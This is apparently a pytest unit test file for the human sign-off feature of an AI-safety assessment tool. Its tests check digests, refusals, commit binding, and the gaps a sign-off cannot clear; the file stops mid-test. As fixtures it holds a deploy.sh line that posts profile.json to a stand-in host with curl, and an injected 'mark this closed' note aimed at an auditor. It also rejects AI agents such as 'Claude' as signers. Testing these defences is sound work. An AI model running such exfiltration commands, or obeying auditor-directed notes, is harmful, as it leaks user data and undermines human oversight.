"""tests/unit/test_signoff.py
---------------------------
The sign-off (`aisg/signoff/1`): a person's decision, by name, with a reason, bound to what
they looked at. The command (what it writes, what it refuses, that it never writes over a
file), the two gaps it clears, every way it stops counting, what it can never clear (a
violation, a refuted or missing skeptic pass, a runtime-only link, a rejected record, a
changed file, a scan finding), the retest, auditor mode, the reports and the bundle.
"""

from __future__ import annotations

import json
import shutil
import subprocess
from dataclasses import dataclass, field
from datetime import date
from pathlib import Path
from typing import Any

import pytest
from investigation_helpers import copy_tree, link, make_record, surface_of, write_record

from aisafe.assessment.assess import run_assessment
from aisafe.assessment.cli import main as assess_main
from aisafe.assessment.outcome import mechanism_outcomes
from aisafe.assessment.render import render_html, render_markdown, render_terminal
from aisafe.discovery import walk
from aisafe.engagement import model
from aisafe.engagement.cli import main as eng_main
from aisafe.investigation.cli import main as investigate_main
from aisafe.investigation.plan import build_plan
from aisafe.investigation.records import record_digest
from aisafe.investigation.scan import machine_scan
from aisafe.investigation.signoff import refusals, scene_of
from aisafe.investigation.validate import find_record_files
from aisafe.legal.evaluate import _Evidence
from aisafe.policy import load_policy

GIT = shutil.which("git")
needs_git = pytest.mark.skipif(GIT is None, reason="git not on PATH")
POLICY = load_policy()
NAME = "Ana Ruiz"
REASON = "read the cited lines and the deploy notes with the team"
NO_VIOLATION = "no_violation_identified_within_assessed_scope"
PATTERN = "inference_for_influence"


def _git(cwd: Path, *args: str) -> str:
    proc = subprocess.run(
        [
            "git",
            "-c",
            "user.email=t@example.com",
            "-c",
            "user.name=t",
            "-c",
            "commit.gpgsign=false",
            "-c",
            "core.autocrlf=false",
            *args,
        ],
        cwd=str(cwd),
        capture_output=True,
        encoding="utf-8",
        errors="replace",
        check=True,
    )
    return proc.stdout


def _repo(tmp_path: Path, *extra: str) -> tuple[Path, str]:
    root = copy_tree("benign_lookalike", tmp_path)
    (root / ".gitignore").write_text(".aisafe-audit/\n", encoding="utf-8")
    for name in extra:
        (root / name).write_text("#!/bin/sh\necho hello\n", encoding="utf-8")
    _git(root, "init", "-q")
    _git(root, "add", ".")
    _git(root, "commit", "-q", "-m", "first")
    return root, _git(root, "rev-parse", "HEAD").strip()


def _links(root: Path) -> list[dict[str, Any]]:
    """A complete chain of M2: a closing proposed on it goes to a person, a violation stands."""
    return [
        link(
            root, "objective", "assistant.py", 7, id="l1", quote="You are an AI writing assistant."
        ),
        link(
            root,
            "inference",
            "assistant.py",
            8,
            id="l2",
            quote="analyze its emotional tone and suggest a kinder wording.",
            **{"from": "l1"},
        ),
        link(root, "intervention", "assistant.py", 18, id="l3", how="traced", **{"from": "l2"}),
    ]


def _record(root: Path, commit: str | None, **over: Any) -> dict[str, Any]:
    """A closing proposed on a complete trace: a benign reading a person weighs, so a review."""
    mode = over.get("mode", "self-assessment")
    plan = build_plan(machine_scan(root, mode=mode))
    base: dict[str, Any] = dict(
        id="inv-tone",
        mechanism="M2",
        pattern=PATTERN,
        surface=surface_of(plan, "prompt", "assistant.py", 7),
        links=_links(root),
        decision="no_violation_identified_in_scope",
        commit=commit,
    )
    return make_record(**{**base, **over})


def _sign(records: Path, root: Path, *args: str, by: str = NAME, reason: str = REASON) -> int:
    return investigate_main(
        ["signoff", str(records), "--by", by, "--reason", reason, "--target", str(root), *args]
    )


def _signoff_file(records: Path) -> Path:
    (path,) = list(records.glob("signoff-*.json"))
    return path


def _edit(directory: Path, /, **fields: Any) -> dict[str, Any]:
    path = _signoff_file(directory)
    doc = json.loads(path.read_text(encoding="utf-8"))
    doc.update(fields)
    path.write_text(json.dumps(doc), encoding="utf-8")
    return doc


def _mech(doc: dict[str, Any], mid: str) -> dict[str, Any]:
    return next(m for m in doc["outcome"]["mechanisms"] if m["id"] == mid)


def _kinds(mech: dict[str, Any]) -> list[str]:
    return [gap["kind"] for gap in mech["gaps"]]


def _assess(root: Path, records: Path, **kw: Any) -> dict[str, Any]:
    run = run_assessment(root, [records], **kw)
    assert run.document is not None, run.fatal
    return run.document


def _signed_repo(tmp_path: Path, *extra: str) -> tuple[Path, str, Path]:
    """A repository with one upheld record at review, signed."""
    root, commit = _repo(tmp_path, *extra)
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    assert _sign(records, root, "--record", "inv-tone") == 0
    return root, commit, records


# ---------------------------------------------------------------------------
# The command
# ---------------------------------------------------------------------------


@needs_git
def test_the_command_computes_the_digests_and_writes_the_document(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path, "deploy.sh")
    records = tmp_path / "records"
    raw = _record(root, commit)
    write_record(records, raw, skeptic="upheld")
    args = ("--record", "inv-tone", "--file", "./deploy.sh")
    assert _sign(records, root, *args) == 0
    doc = json.loads(_signoff_file(records).read_text(encoding="utf-8"))
    assert doc["schema"] == "aisg/signoff/1" and doc["kind"] == "signoff"
    assert doc["by"] == NAME and doc["reason"] == REASON and doc["mode"] == "self-assessment"
    assert doc["target"] == {"commit": commit} and doc["policy_version"] == POLICY.version
    assert date.fromisoformat(doc["at"])
    assert doc["records"] == [{"id": "inv-tone", "record_sha256": record_digest(raw)}]
    (row,) = doc["files"]
    assert row["path"] == "deploy.sh" and len(row["sha256"]) == 64


@needs_git
@pytest.mark.parametrize(
    ("by", "reason", "said"),
    [
        (NAME, "", "reason is empty"),
        (NAME, "   ", "reason is empty"),
        (NAME, "the system is safe to deploy", "verdict"),
        (NAME, "this part is compliant", "verdict"),
        (NAME, "line one\nline two", "single line"),
        ("", REASON, "is empty"),
        ("Claude", REASON, "tool or an agent"),
        ("an AI agent", REASON, "tool or an agent"),
        ("the assistant", REASON, "tool or an agent"),
        ("Claude Code", REASON, "tool or an agent"),
        ("claude-3-opus", REASON, "tool or an agent"),
    ],
)
def test_the_command_refuses_a_name_or_reason_that_cannot_stand(
    tmp_path: Path, capsys, by: str, reason: str, said: str
) -> None:
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    assert _sign(records, root, "--record", "inv-tone", by=by, reason=reason) == 2
    assert said in capsys.readouterr().err
    assert not list(records.glob("signoff-*.json"))


@needs_git
def test_the_command_refuses_what_could_never_count(tmp_path: Path, capsys) -> None:
    root, commit = _repo(tmp_path, "deploy.sh")
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    assert _sign(records, root) == 2
    assert "--record or --file" in capsys.readouterr().err
    assert _sign(records, root, "--record", "nobody") == 2
    assert "no accepted record" in capsys.readouterr().err
    assert _sign(records, root, "--file", "assistant.py") == 2
    assert "not on the list of unread files" in capsys.readouterr().err
    assert _sign(records, root, "--file", "../outside.sh") == 2
    assert not list(records.glob("signoff-*.json"))
    (root / "deploy.sh").write_text("#!/bin/sh\necho changed\n", encoding="utf-8")
    assert _sign(records, root, "--file", "deploy.sh") == 2
    assert "commit first" in capsys.readouterr().err


def test_outside_git_the_command_says_to_commit_first(tmp_path: Path, capsys) -> None:
    root = copy_tree("benign_lookalike", tmp_path)
    (root / "deploy.sh").write_text("#!/bin/sh\necho hello\n", encoding="utf-8")
    assert _sign(tmp_path / "records", root, "--file", "deploy.sh") == 2
    assert "commit first" in capsys.readouterr().err


@needs_git
def test_it_never_writes_over_a_sign_off(tmp_path: Path, capsys) -> None:
    root, _, records = _signed_repo(tmp_path)
    before = _signoff_file(records).read_bytes()
    assert _sign(records, root, "--record", "inv-tone") == 2
    assert "never written over" in capsys.readouterr().err
    assert _signoff_file(records).read_bytes() == before


# ---------------------------------------------------------------------------
# A workbench document, not a record
# ---------------------------------------------------------------------------


@needs_git
def test_it_is_skipped_as_a_record_and_rejected_by_nothing(tmp_path: Path) -> None:
    root, _, records = _signed_repo(tmp_path)
    path = _signoff_file(records)
    found, skipped = find_record_files(records)
    assert path not in found and {"path": path.as_posix(), "why": "a sign-off"} in skipped
    assert find_record_files(path) == ([], [{"path": path.as_posix(), "why": "a sign-off"}])
    assert _assess(root, records)["machine"]["rejected"] == []


def test_the_walk_takes_it_for_the_tools_own_output() -> None:
    text = json.dumps({"schema": "aisg/signoff/1", "kind": "signoff", "id": "x"}, indent=2)
    assert walk.is_own_report("signoff-x.json", text)


@needs_git
def test_a_sign_off_in_the_audit_folder_does_not_dirty_the_tree(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path)
    (root / ".gitignore").write_text("", encoding="utf-8")
    _git(root, "commit", "-q", "-am", "track the audit folder if it holds anything")
    commit = _git(root, "rev-parse", "HEAD").strip()
    records = root / ".aisafe-audit" / "investigations"
    write_record(records, _record(root, commit), skeptic="upheld")
    assert _sign(records, root, "--record", "inv-tone") == 0
    assert machine_scan(root).state.clean
    doc = _assess(root, records)
    assert len(doc["signoffs"]["accepted"]) == 1


# ---------------------------------------------------------------------------
# What it clears
# ---------------------------------------------------------------------------


@needs_git
def test_without_a_sign_off_the_record_stays_at_review(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    doc = _assess(root, records)
    m2 = _mech(doc, "M2")
    assert m2["outcome"] == "inconclusive" and "record_at_review" in _kinds(m2)
    assert doc["signoffs"]["accepted"] == [] and doc["signoffs"]["refused"] == []


@needs_git
def test_a_signed_record_counts_as_a_closing_and_says_who_decided(tmp_path: Path) -> None:
    root, _, records = _signed_repo(tmp_path)
    doc = _assess(root, records)
    (row,) = doc["signoffs"]["accepted"]
    m2 = _mech(doc, "M2")
    assert m2["outcome"] == NO_VIOLATION, m2["gaps"]
    assert m2["closing"] == ["inv-tone"] and m2["reviews"] == [] and m2["signoffs"] == [row["id"]]
    assert m2["closed_on"]["closed"] >= 1
    line = f"inv-tone closed by a person's decision: {NAME} (self-assessed, sign-off {row['id']})"
    assert line in m2["basis"]
    (record,) = doc["machine"]["records"]
    assert record["claim"] == "closes"
    assert record["machine_effective"]["decision"] == "requires_contextual_review"
    assert record["signoffs"][0]["by"] == NAME and record["signoffs"][0]["reason"] == REASON


@needs_git
def test_a_signed_file_leaves_the_gap_and_stays_listed_as_not_read(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path, "deploy.sh")
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    before = _assess(root, records)
    assert all("files_not_read" in _kinds(_mech(before, f"M{n}")) for n in (1, 2, 3))
    assert _sign(records, root, "--file", "deploy.sh") == 0
    doc = _assess(root, records)
    assert not any("files_not_read" in _kinds(m) for m in doc["outcome"]["mechanisms"])
    (row,) = doc["signoffs"]["accepted"]
    unassessed = doc["scope"]["unassessed"]
    assert "deploy.sh" in unassessed["unsupported_files"]
    assert unassessed["signed_off_not_read"] == [
        {
            "path": "deploy.sh",
            "by": NAME,
            "reason": REASON,
            "signoff": row["id"],
            "self_assessed": True,
        }
    ]
    expected = f"signed off, not read: deploy.sh: {NAME} (self-assessed, sign-off {row['id']})"
    for text in (render_markdown(doc), render_html(doc), render_terminal(doc)):
        assert expected in text and REASON in text


@needs_git
def test_one_signed_file_leaves_the_others_in_the_gap(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path, "deploy.sh", "backup.sh")
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    assert _sign(records, root, "--file", "deploy.sh") == 0
    gap = next(
        g for g in _mech(_assess(root, records), "M2")["gaps"] if g["kind"] == "files_not_read"
    )
    assert "1 file(s)" in gap["detail"] and "backup.sh" in gap["detail"]
    assert "deploy.sh" not in gap["detail"]


@needs_git
def test_a_mechanism_closed_with_a_signed_file_says_so(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path, "deploy.sh")
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    assert _sign(records, root, "--record", "inv-tone", "--file", "deploy.sh") == 0
    doc = _assess(root, records)
    (row,) = doc["signoffs"]["accepted"]
    m2 = _mech(doc, "M2")
    assert m2["outcome"] == NO_VIOLATION
    assert (
        f"1 unread file(s) left out by a person's decision: {NAME} (self-assessed, "
        f"sign-off {row['id']})" in m2["basis"]
    )


# ---------------------------------------------------------------------------
# Every way it stops counting
# ---------------------------------------------------------------------------


@needs_git
@pytest.mark.parametrize(
    ("fields", "said"),
    [
        ({"target": {"commit": "0" * 40}}, "made at commit"),
        ({"target": {}}, "made at commit"),
        ({"policy_version": "0.0.1"}, "under policy"),
        ({"mode": "auditor"}, "auditor mode"),
        ({"mode": "nonsense"}, "`mode` must be"),
        ({"by": ""}, "is empty"),
        ({"by": "Claude"}, "tool or an agent"),
        ({"reason": ""}, "reason is empty"),
        ({"reason": "the system is safe"}, "verdict"),
        ({"reason": "it is certified"}, "verdict"),
        ({"at": "someday"}, "ISO date"),
        ({"at": "2999-01-01"}, "in the future"),
        ({"id": "a b"}, "`id` must be"),
        ({"records": [], "files": []}, "names no record and no file"),
        ({"records": "inv-tone"}, "must be lists"),
        ({"records": ["inv-tone"]}, "row of `records`"),
        ({"records": [{"id": "nobody", "record_sha256": "0" * 64}]}, "no accepted record"),
        ({"records": [{"id": "inv-tone", "record_sha256": "0" * 64}]}, "changed after"),
        ({"schema": "aisg/signoff/1", "files": [{"path": "assistant.py"}]}, "not on the list"),
    ],
)
def test_a_sign_off_that_fails_any_check_counts_for_nothing(
    tmp_path: Path, fields: dict[str, Any], said: str
) -> None:
    root, _, records = _signed_repo(tmp_path)
    _edit(records, **fields)
    doc = _assess(root, records)
    assert doc["signoffs"]["accepted"] == []
    (row,) = doc["signoffs"]["refused"]
    assert said in "; ".join(row["why"])
    m2 = _mech(doc, "M2")
    assert m2["outcome"] == "inconclusive" and "record_at_review" in _kinds(m2)
    assert m2["signoffs"] == [] and doc["machine"]["records"][0]["claim"] == "review"


@needs_git
def test_a_record_changed_after_the_sign_off_loses_it(tmp_path: Path) -> None:
    root, commit, records = _signed_repo(tmp_path)
    (records / "inv-tone.json").unlink()
    write_record(
        records, _record(root, commit, hypothesis="another reading of the line"), skeptic="upheld"
    )
    doc = _assess(root, records)
    assert "changed after" in doc["signoffs"]["refused"][0]["why"][0]
    assert "record_at_review" in _kinds(_mech(doc, "M2"))


@needs_git
def test_a_file_hash_that_differs_at_the_commit_counts_for_nothing(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path, "deploy.sh")
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    assert _sign(records, root, "--file", "deploy.sh") == 0
    _edit(records, files=[{"path": "deploy.sh", "sha256": "0" * 64}])
    doc = _assess(root, records)
    assert "not the file the sign-off looked at" in doc["signoffs"]["refused"][0]["why"][0]
    assert "files_not_read" in _kinds(_mech(doc, "M2"))
    assert doc["scope"]["unassessed"]["signed_off_not_read"] == []


@needs_git
def test_a_file_changed_at_a_later_commit_does_not_carry(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path, "deploy.sh")
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    assert _sign(records, root, "--file", "deploy.sh") == 0
    signoff = _signoff_file(records)
    old_sha = json.loads(signoff.read_text(encoding="utf-8"))["files"][0]["sha256"]
    (root / "deploy.sh").write_text("#!/bin/sh\ncurl -d @profile.json example.invalid\n", "utf-8")
    _git(root, "commit", "-q", "-am", "the script changes")
    second = _git(root, "rev-parse", "HEAD").strip()
    write_record(records, _record(root, second), skeptic="upheld")
    doc = _assess(root, records)
    assert "made at commit" in doc["signoffs"]["refused"][0]["why"][0]
    # Pointing the old hash at the new commit by hand does not help.
    _edit(records, target={"commit": second}, files=[{"path": "deploy.sh", "sha256": old_sha}])
    doc = _assess(root, records)
    assert doc["signoffs"]["accepted"] == []
    assert "not the file the sign-off looked at" in doc["signoffs"]["refused"][0]["why"][0]
    assert "files_not_read" in _kinds(_mech(doc, "M2"))


@needs_git
def test_one_bad_row_takes_the_whole_sign_off_with_it(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path, "deploy.sh")
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    assert _sign(records, root, "--record", "inv-tone", "--file", "deploy.sh") == 0
    doc = json.loads(_signoff_file(records).read_text(encoding="utf-8"))
    _edit(records, files=[{"path": "deploy.sh", "sha256": "0" * 64}], records=doc["records"])
    after = _assess(root, records)
    m2 = _mech(after, "M2")
    assert after["signoffs"]["accepted"] == []
    assert "record_at_review" in _kinds(m2) and "files_not_read" in _kinds(m2)


@needs_git
def test_two_files_with_one_id_are_neithers(tmp_path: Path) -> None:
    root, _, records = _signed_repo(tmp_path)
    path = _signoff_file(records)
    shutil.copy(path, records / "copy.json")
    doc = _assess(root, records)
    assert doc["signoffs"]["accepted"] == [] and len(doc["signoffs"]["refused"]) == 2
    assert "same id" in doc["signoffs"]["refused"][0]["why"][0]


@needs_git
def test_on_a_tree_that_is_not_the_commit_nothing_counts(tmp_path: Path) -> None:
    root, _, records = _signed_repo(tmp_path)
    (root / "later.py").write_text("X = 1\n", encoding="utf-8")
    doc = _assess(root, records, working_tree=True)
    assert doc["signoffs"]["accepted"] == []
    assert "commit first" in " ".join(doc["signoffs"]["refused"][0]["why"])
    assert "record_at_review" in _kinds(_mech(doc, "M2"))


def test_outside_git_a_sign_off_is_refused_and_says_to_commit_first(tmp_path: Path) -> None:
    root = copy_tree("benign_lookalike", tmp_path)
    records = tmp_path / "records"
    raw = _record(root, None)
    write_record(records, raw, skeptic="upheld")
    (records / "signoff-hand.json").write_text(
        json.dumps(
            {
                "schema": "aisg/signoff/1",
                "kind": "signoff",
                "id": "signoff-hand",
                "by": NAME,
                "at": "2026-10-30",
                "mode": "self-assessment",
                "target": {"commit": None},
                "policy_version": POLICY.version,
                "reason": REASON,
                "records": [{"id": "inv-tone", "record_sha256": record_digest(raw)}],
                "files": [],
            }
        ),
        encoding="utf-8",
    )
    doc = _assess(root, records)
    assert doc["signoffs"]["accepted"] == []
    assert "commit first" in doc["signoffs"]["refused"][0]["why"][0]
    assert "record_at_review" in _kinds(_mech(doc, "M2"))


@needs_git
def test_a_refused_file_gets_none_of_its_words_into_a_report(tmp_path: Path) -> None:
    root, _, records = _signed_repo(tmp_path)
    _edit(records, reason="the whole system is safe to deploy", by="Claude")
    doc = _assess(root, records)
    (row,) = doc["signoffs"]["refused"]
    assert row["by"] is None and row["reason"] is None
    for text in (render_markdown(doc), render_html(doc), render_terminal(doc)):
        assert "refused, counts for nothing" in text and "safe to deploy" not in text


# ---------------------------------------------------------------------------
# What it can never clear
# ---------------------------------------------------------------------------


def _forge(records: Path, root: Path, commit: str, raw: dict[str, Any]) -> None:
    """A file the command would refuse to write, written by hand."""
    (records / "signoff-forged.json").write_text(
        json.dumps(
            {
                "schema": "aisg/signoff/1",
                "kind": "signoff",
                "id": "signoff-forged",
                "by": NAME,
                "at": "2026-10-30",
                "mode": raw["mode"],
                "target": {"commit": commit},
                "policy_version": POLICY.version,
                "reason": REASON,
                "records": [{"id": raw["id"], "record_sha256": record_digest(raw)}],
                "files": [],
            }
        ),
        encoding="utf-8",
    )


@needs_git
def test_a_violation_cannot_be_signed(tmp_path: Path, capsys) -> None:
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    raw = _record(root, commit, decision="violates_policy")
    write_record(records, raw, skeptic="upheld")
    assert _sign(records, root, "--record", "inv-tone") == 2
    assert "acts only on a record at review" in capsys.readouterr().err
    _forge(records, root, commit, raw)
    doc = _assess(root, records)
    assert doc["signoffs"]["accepted"] == []
    m2 = _mech(doc, "M2")
    assert m2["outcome"] == "violations_identified" and m2["establishing"] == ["inv-tone"]


@needs_git
def test_a_proposed_violation_lowered_to_review_cannot_become_a_closing(tmp_path: Path) -> None:
    # The machine lowered it for a missing link: it is at review, and still proposes a violation.
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    raw = _record(root, commit, decision="violates_policy", links=_links(root)[:1])
    write_record(records, raw, skeptic="upheld")
    _forge(records, root, commit, raw)
    doc = _assess(root, records)
    assert "it proposes violates_policy" in doc["signoffs"]["refused"][0]["why"][0]
    assert doc["machine"]["records"][0]["claim"] == "review"


@needs_git
def test_a_closing_record_beside_a_violation_lowers_nothing(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    write_record(records, _record(root, commit), skeptic="upheld")
    other = _record(root, commit, id="inv-other", decision="violates_policy")
    write_record(records, other, skeptic="upheld")
    assert _sign(records, root, "--record", "inv-tone") == 0
    m2 = _mech(_assess(root, records), "M2")
    assert m2["outcome"] == "violations_identified"
    assert m2["establishing"] == ["inv-other"] and m2["closing"] == ["inv-tone"]


@needs_git
@pytest.mark.parametrize(
    ("skeptic", "said"), [("refuted", "no bound skeptic pass"), (None, "no bound skeptic pass")]
)
def test_a_refuted_or_missing_skeptic_pass_cannot_be_signed_away(
    tmp_path: Path, capsys, skeptic: str | None, said: str
) -> None:
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    raw = _record(root, commit)
    write_record(records, raw, skeptic=skeptic)
    assert _sign(records, root, "--record", "inv-tone") == 2
    assert said in capsys.readouterr().err
    _forge(records, root, commit, raw)
    doc = _assess(root, records)
    assert said in doc["signoffs"]["refused"][0]["why"][0]
    m2 = _mech(doc, "M2")
    assert m2["outcome"] == "inconclusive" and m2["closing"] == []


@needs_git
def test_a_skeptic_pass_refuted_after_the_sign_off_takes_it_back(tmp_path: Path) -> None:
    root, commit, records = _signed_repo(tmp_path)
    skeptic = records / "inv-tone.skeptic.json"
    doc = json.loads(skeptic.read_text(encoding="utf-8"))
    doc["result"] = "refuted"
    doc["claims"][0]["result"] = "refuted"
    skeptic.write_text(json.dumps(doc), encoding="utf-8")
    raw_path = records / "inv-tone.json"
    raw = json.loads(raw_path.read_text(encoding="utf-8"))
    raw["skeptic"]["result"] = "refuted"
    raw_path.write_text(json.dumps(raw), encoding="utf-8")
    after = _assess(root, records)
    assert after["signoffs"]["accepted"] == []
    assert "no bound skeptic pass" in after["signoffs"]["refused"][0]["why"][0]


@needs_git
def test_a_runtime_only_link_cannot_be_signed_away(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    links = _links(root)
    links[0]["how"] = "runtime-only"
    raw = _record(root, commit, links=links)
    write_record(records, raw, skeptic="upheld")
    _forge(records, root, commit, raw)
    doc = _assess(root, records)
    assert doc["signoffs"]["accepted"] == []
    assert "runtime_only" in _kinds(_mech(doc, "M2"))


@needs_git
def test_a_claim_the_machine_could_not_read_stays_unknown(tmp_path: Path) -> None:
    # Proposed as unknown evidence: at review, with nothing a person's name can make supported.
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    raw = _record(root, commit, evidence_status="unknown")
    write_record(records, raw, skeptic="upheld")
    _forge(records, root, commit, raw)
    doc = _assess(root, records)
    assert "its evidence is unknown" in " ".join(doc["signoffs"]["refused"][0]["why"])
    assert "record_at_review" in _kinds(_mech(doc, "M2"))


@needs_git
def test_a_rejected_record_cannot_be_signed(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    raw = _record(root, commit)
    write_record(records, raw, skeptic="upheld")
    good = _record(root, commit, id="inv-good")
    write_record(records, good, skeptic="upheld")
    broken = json.loads((records / "inv-tone.json").read_text(encoding="utf-8"))
    broken["links"][0]["quote"] = "a line nobody wrote anywhere in this file"
    (records / "inv-tone.json").write_text(json.dumps(broken), encoding="utf-8")
    _forge(records, root, commit, broken)
    doc = _assess(root, records)
    assert doc["signoffs"]["accepted"] == []
    assert "no accepted record" in doc["signoffs"]["refused"][0]["why"][0]
    assert "rejected_record" in _kinds(_mech(doc, "M2"))


@dataclass
class R:
    """The fields of a validated record the outcome reads."""

    id: str
    mechanism: str
    pattern: str
    claim: str
    surface: dict[str, Any]
    complete: bool = True
    skeptic: dict[str, Any] = field(default_factory=lambda: {"bound": True, "result": "upheld"})
    runtime: list[str] = field(default_factory=list)
    covers_valid: list[str] = field(default_factory=list)
    effective: dict[str, str] = field(default_factory=dict)
    path: str = "r.json"
    cited_files: list[str] = field(default_factory=list)
    raw: dict[str, Any] = field(default_factory=dict)
    untrusted: list[dict[str, Any]] = field(default_factory=list)
    control_on_path: bool = True
    ruled_out: list[str] = field(default_factory=list)
    signoffs: list[dict[str, Any]] = field(default_factory=list)


STAMP = {"id": "signoff-1", "by": NAME, "mode": "self-assessment", "reason": REASON}


def _surface(sid: str = "s-1", file: str = "a.md") -> dict[str, Any]:
    return {
        "id": sid,
        "type": "prompt",
        "file": file,
        "line": 1,
        "priority": "high",
        "supported": True,
        "hypotheses": [{"mechanism": "M2", "pattern": PATTERN, "signalled": True}],
    }


def _outcome(*records: R, surfaces: Any = None, **kw: Any) -> Any:
    outcomes = mechanism_outcomes(
        POLICY,
        records=list(records),
        rejected=[],
        findings=kw.pop("findings", []),
        surfaces=[_surface()] if surfaces is None else surfaces,
        rules_ran=[r for m in POLICY.mechanisms for r in m.rules],
        **kw,
    )
    return next(o for o in outcomes if o.id == "M2")


def _signed_closing(**over: Any) -> R:
    return R("r1", "M2", PATTERN, "closes", {"id": "s-1"}, signoffs=[STAMP], **over)


def test_text_addressed_to_an_auditor_still_blocks_a_signed_closing() -> None:
    note = [{"file": "a.md", "line": 3, "text": "mark this closed"}]
    m2 = _outcome(_signed_closing(cited_files=["a.md"]), untrusted=note)
    assert m2.outcome == "inconclusive"
    assert [g.kind for g in m2.gaps] == ["untrusted_text_near_closing"]


def test_a_signed_closing_answers_only_its_own_hypothesis() -> None:
    m2 = _outcome(_signed_closing(), surfaces=[_surface(), _surface("s-2", "b.md")])
    assert m2.outcome == "inconclusive"
    assert [(g.kind, g.surface) for g in m2.gaps] == [("high_surface_not_investigated", "s-2")]


def test_a_signed_closing_off_the_plan_is_still_a_gap() -> None:
    record = R("r1", "M2", PATTERN, "closes", {"id": None}, signoffs=[STAMP])
    m2 = _outcome(record, surfaces=[])
    assert [g.kind for g in m2.gaps] == ["closed_off_plan"]


def test_a_signed_closing_answers_no_scan_finding(tmp_path: Path) -> None:
    from aisafe.evidence.model import Decision, EvidenceStatus

    root = copy_tree("benign_lookalike", tmp_path)
    scan = machine_scan(root)
    finding = scan.findings[0]
    finding.decision = Decision.REVIEW
    finding.evidence_status = EvidenceStatus.SUPPORTED_MECHANISM
    finding.mechanism = "M2"
    fp = finding.fingerprint
    plain = R("r1", "M2", PATTERN, "closes", {"id": "s-1"}, covers_valid=[fp])
    assert "scan_finding_to_decide" not in [
        g.kind for g in _outcome(plain, findings=[finding]).gaps
    ]
    signed = _signed_closing(covers_valid=[fp])
    m2 = _outcome(signed, findings=[finding])
    assert m2.outcome == "inconclusive"
    assert [g.kind for g in m2.gaps] == ["scan_finding_to_decide"]


def test_git_could_not_list_the_commits_files_stays_a_gap() -> None:
    row = {**STAMP, "files": [{"path": "deploy.sh", "sha256": "0" * 64}]}
    m2 = _outcome(
        _signed_closing(),
        tracked_not_walked=None,
        unsupported_files=["deploy.sh"],
        signed_files=[row],
    )
    (gap,) = m2.gaps
    assert gap.kind == "files_not_read" and "git could not list" in gap.detail
    assert "deploy.sh" not in gap.detail


def test_the_legal_section_does_not_read_a_sign_off() -> None:
    affiliate = {"kind": "closed", "mechanism": "M2", "pattern": PATTERN, "what": "x"}

    def item(*records: R, **kw: Any) -> dict[str, Any]:
        outcomes = mechanism_outcomes(
            POLICY,
            records=list(records),
            rejected=[],
            findings=[],
            surfaces=[_surface()],
            rules_ran=[r for m in POLICY.mechanisms for r in m.rules],
            **kw,
        )
        evidence = _Evidence(
            policy=POLICY,
            outcomes=outcomes,
            records=list(records),
            surfaces=[_surface()],
            findings=[],
            evaluation=None,
            requests={},
            carried=[],
        )
        return evidence.pattern_item(affiliate)

    machine = R("r1", "M2", PATTERN, "closes", {"id": "s-1"})
    assert item(machine)["status"] == "met"
    assert item(_signed_closing())["status"] == "missing"
    row = {**STAMP, "files": [{"path": "deploy.sh", "sha256": "0" * 64}]}
    signed_file = item(machine, unsupported_files=["deploy.sh"], signed_files=[row])
    assert signed_file["status"] == "missing" and "deploy.sh" in signed_file["detail"]


# ---------------------------------------------------------------------------
# A new commit
# ---------------------------------------------------------------------------


@needs_git
def test_a_sign_off_does_not_carry_to_a_new_commit(tmp_path: Path) -> None:
    root, commit, records = _signed_repo(tmp_path)
    first = _assess(root, records)
    assert _mech(first, "M2")["outcome"] == NO_VIOLATION
    previous = tmp_path / "first" / "assessment.json"
    previous.parent.mkdir()
    previous.write_text(json.dumps(first), encoding="utf-8")
    (root / "notes.txt").write_text("unrelated\n", encoding="utf-8")
    _git(root, "add", ".")
    _git(root, "commit", "-q", "-m", "a later commit")
    second = _git(root, "rev-parse", "HEAD").strip()
    # The same record, made again at the new commit: its digest is new as well.
    write_record(records, _record(root, second, id="inv-tone-2"), skeptic="upheld")
    doc = _assess(root, records, retest=previous)
    assert doc["signoffs"]["accepted"] == []
    assert "made at commit" in doc["signoffs"]["refused"][0]["why"][0]
    m2 = _mech(doc, "M2")
    assert m2["outcome"] == "inconclusive" and "record_at_review" in _kinds(m2)


@needs_git
def test_a_signed_record_at_a_new_commit_does_not_remediate_a_violation(tmp_path: Path) -> None:
    root, commit = _repo(tmp_path)
    records = tmp_path / "records"
    steps = [{"id": "v1", "purpose": "remediation", "kind": "reinvestigate", "note": "read it"}]
    raw = _record(root, commit, decision="violates_policy", steps=steps)
    write_record(records, raw, skeptic="upheld")
    first = _assess(root, records)
    assert _mech(first, "M2")["outcome"] == "violations_identified"
    previous = tmp_path / "first" / "assessment.json"
    previous.parent.mkdir()
    previous.write_text(json.dumps(first), encoding="utf-8")
    text = (root / "assistant.py").read_text(encoding="utf-8")
    (root / "assistant.py").write_text(text + "\n# a later line\n", encoding="utf-8")
    _git(root, "commit", "-q", "-am", "nothing real changes")
    second = _git(root, "rev-parse", "HEAD").strip()
    write_record(records, _record(root, second, id="inv-after", steps=steps), skeptic="upheld")
